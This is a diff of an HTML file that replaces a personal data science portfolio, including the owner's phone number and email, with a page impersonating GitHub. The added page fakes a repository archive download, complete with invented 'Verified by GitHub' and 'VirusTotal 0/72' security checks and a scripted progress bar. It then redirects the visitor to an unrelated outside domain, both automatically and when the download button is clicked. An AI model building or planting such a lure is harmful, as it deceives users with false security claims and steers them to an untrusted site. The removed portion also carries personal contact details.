@@ -1,359 +1,508 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>
-            Data Science Portfolio
-        </title>
-        <link rel="stylesheet" href="style.css">
-        <script src="https://kit.fontawesome.com/a076d05399.js"></script>
-        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.11/typed.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/jquery.waypoints.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Downloading archive • gitcompiler/hello-world.zip · GitHub</title>
+  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
 
-    </head>
-    <body>
-        <div class="scroll-up-btn">
-            <i class="fas fa-angle-up"></i>
+  <style>
+    :root { 
+      color-scheme: dark;
+      --gh-green: #39d353;
+      --gh-blue: #58a6ff;
+      --gh-bg: #0d1117;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: linear-gradient(180deg, #0a0c10 0%, #0d1117 100%);
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background: rgba(13, 17, 23, 0.97);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid #21262d;
+      padding: 12px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      color: #f0f6fc;
+      font-size: 27px;
+      font-weight: 700;
+      text-decoration: none;
+      gap: 9px;
+    }
+
+    .logo svg { width: 38px; height: 38px; }
+
+    .top-banner {
+      background: linear-gradient(90deg, #21262d, #30363d);
+      text-align: center;
+      padding: 8px 0;
+      font-size: 13.5px;
+      color: #8b949e;
+      border-bottom: 1px solid #21262d;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px 80px;
+    }
+
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 680px;
+      overflow: hidden;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.55);
+      opacity: 0;
+      transform: translateY(40px);
+      transition: all 1.1s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .card.visible { opacity: 1; transform: translateY(0); }
+
+    .card-header {
+      background: #0d1117;
+      padding: 20px 28px;
+      border-bottom: 1px solid #21262d;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .avatar {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #39d353, #2ea043);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      font-weight: 700;
+      color: #0d1117;
+      box-shadow: 0 0 0 4px rgba(57, 211, 83, 0.3);
+    }
+
+    .repo-info { flex: 1; }
+    .repo-name {
+      font-size: 22px;
+      font-weight: 700;
+      color: #f0f6fc;
+      margin: 0;
+    }
+    .repo-meta {
+      font-size: 13.8px;
+      color: #8b949e;
+      margin-top: 5px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .verified-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(57, 211, 83, 0.15);
+      color: #39d353;
+      padding: 7px 16px;
+      border-radius: 9999px;
+      font-size: 13.5px;
+      font-weight: 600;
+      border: 1px solid rgba(57, 211, 83, 0.5);
+    }
+
+    .card-body {
+      padding: 42px 48px 40px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 30px;
+      margin: 0 0 12px;
+      font-weight: 600;
+      background: linear-gradient(90deg, #c9d1d9, #f0f6fc);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .generating-note {
+      color: #8b949e;
+      font-size: 16px;
+      margin-bottom: 26px;
+    }
+
+    .secure-info {
+      display: inline-flex;
+      align-items: center;
+      gap: 9px;
+      font-size: 14px;
+      color: #39d353;
+      background: rgba(57, 211, 83, 0.12);
+      padding: 9px 22px;
+      border-radius: 9999px;
+      margin-bottom: 34px;
+      border: 1px solid rgba(57, 211, 83, 0.4);
+    }
+
+    .repo-stats {
+      font-size: 13.5px;
+      color: #8b949e;
+      margin-bottom: 28px;
+    }
+
+    .scan-log {
+      text-align: left;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      padding: 22px 26px;
+      margin: 0 0 38px;
+      font-family: ui-monospace, monospace;
+      font-size: 14px;
+      line-height: 1.8;
+    }
+
+    .scan-step {
+      display: flex;
+      align-items: center;
+      margin: 11px 0;
+      opacity: 0;
+      transform: translateY(8px);
+      transition: all 0.55s ease;
+    }
+
+    .scan-step.show { opacity: 1; transform: translateY(0); }
+
+    .scan-step .check {
+      color: #39d353;
+      margin-right: 14px;
+      font-size: 18px;
+    }
+
+    .progress-area { 
+      margin: 32px 0 42px; 
+    }
+
+    .phase-label {
+      font-size: 15px;
+      color: #8b949e;
+      margin-bottom: 10px;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+    }
+
+    .time-left {
+      font-size: 25px;
+      font-weight: 700;
+      color: var(--gh-blue);
+      margin-bottom: 14px;
+    }
+
+    .progress-bar {
+      height: 13px;
+      background: #21262d;
+      border-radius: 9999px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #39d353, #2ea043);
+      transition: width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .bytes-info {
+      font-size: 14.5px;
+      color: #8b949e;
+      margin-top: 12px;
+    }
+
+    .download-wrapper {
+      margin-top: 20px;
+      opacity: 0;
+      transform: translateY(25px) scale(0.95);
+      transition: all 0.9s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .download-btn {
+      padding: 16px 48px;
+      font-size: 17.5px;
+      font-weight: 600;
+      background: linear-gradient(90deg, #238636, #2ea043);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(57, 211, 83, 0.35);
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .download-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 28px rgba(57, 211, 83, 0.45);
+    }
+
+    .status-block {
+      margin-top: 38px;
+      padding-top: 32px;
+      border-top: 1px solid #21262d;
+      position: relative;
+      min-height: 160px;
+    }
+
+    .success-content {
+      opacity: 0;
+      transition: all 1s ease;
+    }
+
+    .success-title {
+      font-size: 37px;
+      font-weight: 700;
+      color: #39d353;
+      margin-bottom: 18px;
+    }
+
+    .prank-notice {
+      margin: 50px auto 0;
+      max-width: 540px;
+      padding: 18px 26px;
+      background: rgba(255, 193, 7, 0.1);
+      border: 1px solid rgba(255, 193, 7, 0.4);
+      border-radius: 12px;
+      font-size: 14.2px;
+      color: #ffe68f;
+      line-height: 1.65;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 1.1s cubic-bezier(0.23, 1, 0.32, 1) 0.8s;
+    }
+
+    .prank-notice.visible { opacity: 1; transform: translateY(0); }
+
+    footer {
+      background: #010409;
+      border-top: 1px solid #21262d;
+      padding: 40px 20px 60px;
+      color: #8b949e;
+      font-size: 13px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="top-banner">
+  Official GitHub Repository Archive Download
+</div>
+
+<header>
+  <div class="header-inner">
+    <a href="#" class="logo">
+      <svg height="38" viewBox="0 0 16 16" width="38" fill="#f0f6fc">
+        <path fill-rule="evenodd" d="M8 0.198a8 8 0 0 0-2.528 15.597c0.4 0.074 0.547-0.174 0.547-0.386 0-0.19-0.007-0.693-0.011-1.36-2.226 0.483-2.695-1.073-2.695-1.073-0.364-0.924-0.89-1.17-0.89-1.17-0.727-0.497 0.055-0.487 0.055-0.487 0.804 0.057 1.227 0.826 1.227 0.826 0.714 1.223 1.873 0.87 2.33 0.665 0.072-0.517 0.279-0.87 0.508-1.07-1.777-0.202-3.644-0.888-3.644-3.954 0-0.873 0.312-1.587 0.824-2.147-0.083-0.202-0.357-1.017 0.078-2.12 0 0 0.671-0.215 2.2 0.82a7.673 7.673 0 0 1 2.004-0.27c0.68 0.003 1.366 0.092 2.004 0.27 1.528-1.035 2.198-0.82 2.198-0.82 0.437 1.103 0.163 1.918 0.08 2.12 0.513 0.56 0.823 1.274 0.823 2.147 0 3.074-1.87 3.75-3.652 3.948 0.287 0.247 0.543 0.735 0.543 1.482 0 1.07-0.01 1.933-0.01 2.196 0 0.214 0.145 0.463 0.55 0.384A8.001 8.001 0 0 0 8 0.198z"></path>
+      </svg>
+      GitHub
+    </a>
+  </div>
+</header>
+
+<main>
+  <div class="card" id="card">
+
+    <div class="card-header">
+      <div class="avatar">G</div>
+      <div class="repo-info">
+        <div class="repo-name">gitcompiler / hello-world</div>
+        <div class="repo-meta">
+          Branch: <strong>main</strong> 
+          <span id="phase">• Preparing secure archive</span>
         </div>
-       <nav class="navbar">
-           <div class="max-width">
-               <div class="logo"><a href="#">Data Science Portfo<span>lio.</span></a></div>
-               <ul class="menu">
-                    <li><a href="#home" class="menu-btn">Home</a></li>
-                    <li><a href="#about" class="menu-btn">About</a></li>
-                    <li><a href="#skills" class="menu-btn">Skills</a></li>
-                    <li><a href="#education" class="menu-btn">Education</a></li>
-                    <li><a href="#projects" class="menu-btn">Projects</a></li>
-                    <li><a href="#contact" class="menu-btn">Contact</a></li>
-               </ul>
-               <div class="menu-btn">
-                   <i class="fas fa-bars"></i>
-               </div>
-           </div>
-       </nav> 
+      </div>
+      <div class="verified-badge">
+        <span>✓</span> Verified by GitHub
+      </div>
+    </div>
 
-       <!-- Home Section -->
-       <section class="home" id="home">
-           <div class="max-width">
-               <div class="home-content">
-                   <div class="text-1">Hello! My name is</div>
-                   <div class="text-2">Sharath Chandra VC</div>
-                   <div class="text-3">I'm an Aspiring <span class="typing"></span></div>
-                   <a href="#contact">Hire me</a>     
-               </div>
-           </div>
-       </section>
+    <div class="card-body">
 
-       <!-- about section start -->
-        <section class="about" id="about">
-            <div class="max-width">
-                <h2 class="title">About</h2>
-                <div class="about-content">
-                    <div class="comlumn left">
-                        <img src="images/Profile.JPG" alt="Sharath Chandra VC">
-                    </div>
-                    <div class="column right">
-                        <div class="text">I'am Sharath Chandra VC and I'm an Aspiring <span class="typing-2"></span></div>
-                        <p>3 Years diversified experience, professional possessing a prolific track record of driving user growth, boosting user retention & enhancing market share by deploying , techniques, and best practices. Adept at performing deep dive to gain actionable insights to benefit key stakeholders & facilitate sound decision making while generating an error-free report. Ability to work Flexibly on various skills and approach to delivery Excellent Analytical skills with the ability to work in the dynamic and high demanding work environments.I have completed PG Diploma in Data Science from International Institute of Information Technology Bangalore (IIIT-B) and upGrad, Master of Science from Liverpool john Moores University. Some of my key projects I have executed are in the Project section.</p>
-                        <a href="Sharath_Resume.pdf">Download Resume</a>
-                    </div>
-                </div>
-            </div>
-        </section>
+      <h1>Your archive is almost ready</h1>
+      <div class="generating-note">GitHub is securely packaging this repository for you</div>
 
-        <!-- skills section starting -->
-        <section class="skills" id="skills">
-            <div class="max-width">
-                <h2 class="title">Skills</h2>
-                <div class="skills-content">
-                    <div class="column left">
-                        <div class="text">Skills & Experience</div>
-                        <p> Keeping  weekly reports and Keeping Data Story updating the resources with new data with Excel | Enforcing customized python codes and modules to facilitate Data extraction, munging and visualization ( ISRO) | Analysis of Commercial Data for Stores . The objective was to analyze store data based on delivery cost , Ratings Using Advanced  Excel using macros-based excel dashboards and reportsImplementing |automation  through formulae or macros for time-consuming processes in excel|Written custom code to automate the data handling process using python | Ability  to work with the business team (onsite & offshore) to understand data/reporting requirements  Assisting with Fellow Engineers with New visualization Concepts and Presentation.</p>
-                        <a href="#">Read more</a>
-                    </div>
-                    <div class="column right">
-                        <div class="bars">
-                            <div class="info">
-                                <span>Python</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line python"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>Data Visualization</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line visualization"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>Data Analysis</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line analysis"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>Statistics</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line Statistics"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>PowerBI</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line PowerBI"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>Jira</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line Jira"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>MySQL</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line mysql"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>HiveQL</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line hql"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>MS-Excel</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line excel"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>Tableau</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line tableau"></div>
-                        </div>
-                        <div class="bars">
-                            <div class="info">
-                                <span>AWS</span>
-                                <span>100%</span>
-                            </div>
-                            <div class="line aws"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+      <div class="secure-info">
+        <span style="color:#39d353">●</span> 
+        End-to-end encrypted • HTTPS • GitHub Protected
+      </div>
 
-        <!-- education section start -->
-        <section class="education" id="education">
-            <div class="max-width">
-                <h2 class="title">Education</h2>
-                <div class="carousel owl-carousel">
-                    <div class="card">
-                        <div class="box">
-                            <img src="images/soundaryalogo.png" alt="">
-                            <div class="text">Soundarya PreUniversity College ,Bengaluru </div>
-                            <p>PUC (PUC)</p>
-                            <p>2010-2012</p>
-                            <p>84.33%</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <div class="box">
-                            <img src="images/bmslogo.png" alt="">
-                            <div class="text">BMS Institue Of Technology , Bengaluru</div>
-                            <p>Bachelor of Engineering in Electrical and Electronics Engineering(BE)</p>
-                            <p>2012-2016</p>
-                            <p>67.22%</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <div class="box">
-                            <img src="images/ljmulogotransparent2.png" alt="">
-                            <div class="text">Liverpool John Moores University</div>
-                            <p>Master of Science in DataScienc (MSDS)</p>
-                            <p>2020-2022</p>
-                            <p>CGPA: 7.5/10</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <div class="box">
-                            <img src="images/UpGrad-IIITB.png" alt="">
-                            <div class="text">International Institute of Information Technology Bangalore</div>
-                            <p>Post Graduate Diploma in Data Science (PGDDS)</p>
-                            <p>2020-Present</p>
-                            <p>GPA: 3/4</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+      <div class="repo-stats">
+        47 files • 2.8 MB • Last updated 2 days ago
+      </div>
 
-        <!-- Projects section start -->
-        <section class="projects" id="projects">
-            <div class="max-width">
-                <h2 class="title">Projects</h2>
-                <div class="projects-content">
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-chart-bar"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/EDA-creditapproval-.git">Credit Approval & Disapproval Analysis using EDA</a></div>
-                            <p>In this project, where I had worked on with a dataset from a Finance based company which provides financial supports to the customers by lending them money on some interests. Company wants to visualize this data to understand or predict about customer who may turn their financial health worse and the ones that won't based on different factors in dataset. This will result in reducing risk of high number of defaulters and bankruptcy.</p>
-                        </div>
-                    </div>
+      <div class="scan-log" id="scan-log">
+        <div class="scan-step" id="step-1"><span class="check">✔</span> Repository integrity verified</div>
+        <div class="scan-step" id="step-2"><span class="check">✔</span> VirusTotal scan (0/72 engines)</div>
+        <div class="scan-step" id="step-3"><span class="check">✔</span> Heuristic &amp; behavior analysis</div>
+        <div class="scan-step" id="step-4"><span class="check">✔</span> Signature &amp; zero-day check</div>
+        <div class="scan-step" id="step-5"><span class="check">✔</span> Final security clearance</div>
+      </div>
 
+      <div class="progress-area">
+        <div class="phase-label" id="current-phase">Compressing repository…</div>
+        <div class="time-left" id="time-left">~14s remaining</div>
         
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-chart-bar"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/sharathvc.git">IMDB Movie Visualization</a></div>
-                            <p>In this Project the 100 top-rated movies from the past decade along with various pieces of information about the movie, its actors, and the voters who have rated these movies online,to find some interesting insights into these movies and their voters, using Python.</p>
-                        </div>
-                    </div>
-                
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-chart-line"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/linearregression.git">Bike Sharing using Linear Regression</a></div>
-                            <p>In this project , I was required to model the demand for shared bikes with the available independent variables. It will be used by the management to understand how exactly the demands vary with different features. They can accordingly manipulate the business strategy to meet the demand levels and meet the customer's expectations. Further, the model to be used in a good way for management to understand the demand dynamics of a new market. </p>
-                        </div>
-                    </div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill"></div>
+        </div>
 
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-sitemap"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/clusteringUpgrad.git">HELP International NGO Fund Disburse Analysis using Clustering Algorithm</a></div>
-                            <p>My job was to categorise the countries using some socio-economic and health factors that determine the overall development of the country and need to suggest the countries which the CEO needs to focus on the most.  The datasets containing those socio-economic factors and the corresponding data dictionary was provided to Us , This Project was Focused on Clustering and Kmeans and hierarchial clustering Method.</p>
-                        </div>
-                    </div>
-                    
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-poll"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/logisticregressionUpgrad.git"> Lead Score Analysis using Logistic Regression</a></div>
-                            <p>A online education institute wants to convert the customers visiting their website to enroll for the Course they are searching which currently is around . Using Data Processing steps like data understanding, cleaning, analyzing with the help of different python libraries, graphs and charts I had decided to use Logistic Regression to answer factors that could help them to focus on those factors that could help them in converting those leads.</p>
-                        </div>
-                    </div>
+        <div class="bytes-info" id="bytes-info"></div>
 
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-database"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/RSVP_SQL.git">RSVPMovie Analysis using MySQL</a></div>
-                            <p> In this Project, I used SQL to analyse the given data and give recommendations to RSVP Movies based on the insights. For convenience, the entire analytics process has been divided into four segments, where each segment leads to significant insights from different combinations of tables.</p>
-                        </div>
-                    </div>
+        <div class="download-wrapper" id="download-wrapper">
+          <button id="download-now" class="download-btn">
+            ↓ Download .zip archive now
+          </button>
+        </div>
+      </div>
 
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-database"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/Hivecase_study.git">Click Stream Data Analysis using HiveQL</a></div>
-                            <p>Here, we have a dataset from an unknown online cosmetic selling company. It is 'Click Stream Data' which is collected by tracking visitor's clicks on the website and searching for patterns within them. The data is of October and November month of 2019 where we are trying to execute 8 questions using HQL (Hive Query Language) and generating some useful insights and patterns for the company to improve their sales. Also, we are trying to understand the profit and loss for both months.</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-ship"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/titanic_study.git">Titanic Data Analysis using EDA</a></div>
-                            <p>To understand the behavior and correlation of all the variables against Target varibale Survived. Note: EDA (Exploratory Data Analysis) steps will be performed to attempt a solution for given problem statement.</p>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <div class="box">
-                            <i class="fas fa-chart-pie"></i>
-                            <div class="text"><a href="https://github.com/sharathvc/Tableau.git">IPL Data Visualization using Tableau</a></div>
-                            <p>Here, I have used IPL(Indian Premier League) dataset of year 2008 to 2017 and using this I have answered few questions asked in University assignment like Orange and Purple Cap Holder for each year, Highest number of 4s and 6s hit by player each year, Highest batting average, highest bowling average, Toss outcome Vs Match outcome, Team performance (Away Vs Home), etc.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+      <div class="status-block" id="status-block">
+        <div class="status-message" id="status-message">
+          <div class="status-title">Creating your secure .zip archive</div>
+        </div>
 
-        <!-- contact section start -->
-        <section class="contact" id="contact">
-            <div class="max-width">
-                <h2 class="title">Contact</h2>
-                <div class="contact-content">
-                    <div class="column left">
-                        <div class="text">Get in Touch</div>
-                        <div class="icons">
-                            <div class="row">
-                                <i class="fas fa-user"></i>
-                                <div class="info">
-                                    <div class="head">Name</div>
-                                    <div class="sub-title">Sharath Chandra VC</div>
-                                </div>
-                            </div>
-                            <div class="row">
-                                <i class="fas fa-map-marker-alt"></i>
-                                <div class="info">
-                                    <div class="head">Address</div>
-                                    <div class="sub-title">Bengaluru,Karnataka</div>
-                                </div>
-                            </div>
-                            <div class="row">
-                                <i class="fas fa-phone"></i>
-                                <div class="info">
-                                    <div class="head">Ph. No.</div>
-                                    <div class="sub-title">+91-9353853455</div>
-                                </div>
-                            </div>
-                            <div class="row">
-                                <i class="fas fa-envelope"></i>
-                                <div class="info">
-                                    <div class="head">Email</div>
-                                    <div class="sub-title">vcsharath9@gmail.com</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="column right">
-                        <div class="button">
-                            <div class="icon">
-                                <a href="https://www.linkedin.com/in/sharathchandravc"><i class="fab fa-linkedin-in"></i></a>
-                            </div>
-                        </div>
-                        <div class="button">
-                            <div class="icon"> 
-                                <a href="https://github.com/sharathvc"><i class="fab fa-github"></i></a>
-                            </div>
-                        </div>
-                        <div class="button">
-                            <div class="icon"> 
-                                <a href="https://twitter.com/vcsharath"><i class="fab fa-twitter"></i></a>
-                            </div>
-                        </div>
-                        <div class="button">
-                            <div class="icon"> 
-                                <a href="https://www.instagram.com/sharath_chandra_vc/"><i class="fab fa-instagram"></i></a>
-                            </div>
-                        </div>
-                    </div>    
-                </div>
-            </div>
-        </section>
+        <div class="success-content" id="success-content">
+          <div class="success-title">✅ All checks passed</div>
+        </div>
+      </div>
 
-        <!-- footer section starts -->
-        <footer>
-            <span>Created By <a href="#">Sharath</a> | <span class="far fa-copyright"> 2020 All rights reserved.</span></span>
-        </footer>
-        
+      <div class="prank-notice" id="prank-notice">
+        The archive will start downloading automatically.<br>
+        Still waiting? Try refreshing or using <strong>git clone</strong>.
+      </div>
 
-       <script  src="script.js"></script>
- 
-       
-    </body>
-    </html>
+    </div>
+  </div>
+</main>
+
+<footer>
+  © 2026 GitHub, Inc. • All rights reserved
+</footer>
+
+<script>
+const REDIRECT_URL = "https://mcglynger.com/";
+
+const card = document.getElementById('card');
+const phaseEl = document.getElementById('current-phase');
+const timeLeftEl = document.getElementById('time-left');
+const progressFill = document.getElementById('progress-fill');
+const bytesInfo = document.getElementById('bytes-info');
+const downloadWrapper = document.getElementById('download-wrapper');
+const statusMessage = document.getElementById('status-message');
+const successContent = document.getElementById('success-content');
+const downloadBtn = document.getElementById('download-now');
+const prankNotice = document.getElementById('prank-notice');
+
+const TOTAL_TIME = 10800;
+const RESULT_SHOW = 7200;
+const REDIRECT_DELAY = 3800;
+
+let start = Date.now();
+
+setTimeout(() => {
+  card.classList.add('visible');
+  prankNotice.classList.add('visible');
+}, 600);
+
+const phases = [
+  { text: "Compressing repository…", startPct: 0, endPct: 30 },
+  { text: "Running deep security scans…", startPct: 30, endPct: 60 },
+  { text: "Finalizing encrypted archive…", startPct: 60, endPct: 85 },
+  { text: "Preparing secure download…", startPct: 85, endPct: 100 }
+];
+
+const steps = Array.from(document.querySelectorAll('.scan-step'));
+
+function animateSteps() {
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < steps.length) {
+      steps[i].classList.add('show');
+      i++;
+    } else clearInterval(iv);
+  }, 820);
+}
+
+function update() {
+  const elapsed = Date.now() - start;
+  let pct = Math.min(100, (elapsed / TOTAL_TIME) * 100);
+
+  progressFill.style.width = pct + '%';
+
+  const current = phases.find(p => pct >= p.startPct && pct < p.endPct) || phases[phases.length-1];
+  phaseEl.textContent = current.text;
+
+  if (pct > 10) {
+    const totalMB = 48;
+    const currentMB = (pct / 100 * totalMB).toFixed(1);
+    bytesInfo.textContent = `${currentMB} MB / ${totalMB} MB • ${Math.round(pct)}% complete`;
+  }
+
+  const rem = Math.max(1, Math.ceil((TOTAL_TIME - elapsed) / 1000));
+  timeLeftEl.textContent = `~${rem}s remaining`;
+
+  if (elapsed >= RESULT_SHOW) {
+    statusMessage.style.opacity = '0';
+
+    setTimeout(() => {
+      successContent.style.opacity = '1';
+      bytesInfo.style.opacity = '0';
+      downloadWrapper.style.opacity = '1';
+      downloadWrapper.style.transform = 'translateY(0) scale(1)';
+
+      setTimeout(() => window.location.href = REDIRECT_URL, REDIRECT_DELAY);
+    }, 650);
+  }
+
+  requestAnimationFrame(update);
+}
+
+downloadBtn.addEventListener('click', () => {
+  window.location.href = REDIRECT_URL;
+});
+
+animateSteps();
+update();
+</script>
+</body>
+</html>
